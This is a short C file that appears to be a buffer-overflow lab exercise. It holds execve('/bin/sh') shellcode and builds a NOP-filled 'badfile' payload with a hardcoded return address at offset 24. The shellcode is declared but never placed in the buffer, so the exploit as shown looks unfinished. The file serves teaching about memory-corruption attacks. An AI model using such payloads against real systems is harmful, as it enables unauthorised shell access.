/* exploit.c */
/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]="\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
void main(int argc, char **argv)
{
	char buffer[516];
	FILE *badfile;

/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, 516);

/* You need to fill the buffer with appropriate contents here */
	buffer[24]= 0x36;
	buffer[25]= 0xf5;
	buffer[26]= 0xff;
	buffer[27]= 0xbf;

/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 516, 1, badfile);
	fclose(badfile);
}

